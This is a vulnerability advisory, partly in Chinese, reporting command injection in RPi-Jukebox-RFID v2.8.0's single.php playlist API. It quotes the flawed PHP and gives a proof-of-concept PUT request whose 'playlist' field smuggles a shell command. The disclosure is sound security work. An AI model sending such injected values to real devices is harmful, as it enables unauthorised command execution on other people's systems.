# RCE vulnerability in [RPi-Jukebox-RFID](https://github.com/MiczFlor/RPi-Jukebox-RFID) v2.8.0 of file /single.php

**vender**:

- [MiczFlor/RPi-Jukebox-RFID: A Raspberry Pi jukebox, playing local music, podcasts, web radio and streams triggered by RFID cards, web app or home automation. All plug and play via USB. GPIO scripts available.](https://github.com/MiczFlor/RPi-Jukebox-RFID)

**SoftLink**:

- [Release v2.8.0: Fix Spotify Authentication · MiczFlor/RPi-Jukebox-RFID](https://github.com/MiczFlor/RPi-Jukebox-RFID/releases/tag/v2.8.0)

**Vulnerable File**

- /htdocs/api/playlist/single.php

**Version**

- 2.8.0

### Analyse

```php
/ 在 single.php 中
$playlist = $json['playlist'];
$shuffle = $json['single'];
if ($shuffle === 'true') {
    execScript("single_play.sh -c=singleenable -d='{$playlist}'");
} else {
    execScript("single_play.sh -c=singledisable -d='{$playlist}'");
}
```

这里的 `$playlist` 变量来自用户输入，并且没有进行足够的过滤就被拼接到命令中。

## POC

对于 `single.php`：

```http
PUT /api/playlist/single.php HTTP/1.1
Host: 192.168.129.130
Content-Type: application/json
Content-Length: 69

{
  "playlist": "test';id>2.txt;echo '123",
  "single": "true"
}
```



![image-20250828230503530](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202508282305582.png)



![image-20250828231300334](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202508282313232.png)